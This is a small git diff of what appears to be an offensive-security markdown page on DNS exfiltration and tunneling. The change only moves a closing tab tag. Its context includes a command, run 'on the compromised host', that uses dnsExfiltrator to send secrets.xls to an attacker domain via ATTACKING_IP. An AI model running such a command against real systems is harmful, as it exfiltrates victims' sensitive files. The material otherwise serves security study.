@@ -85,14 +85,13 @@ On the compromised host:
 dnsExfiltrator.exe secrets.xls mydomain.com password s=ATTACKING_IP t=500
 ```
 {% endtab %}
+{% endtabs %}
 
 ### DNS Tunneling
 An other methode is to tunneling other protocols over DNS. Check this page for more details.
 {% content-ref url="../pivoting/dnsTunneling.md" %}
 [dnsTunneling.md](../pivoting/dnsTunneling.md)
 {% endcontent-ref %}
-
-{% endtabs %}
 
 
 ## Resources
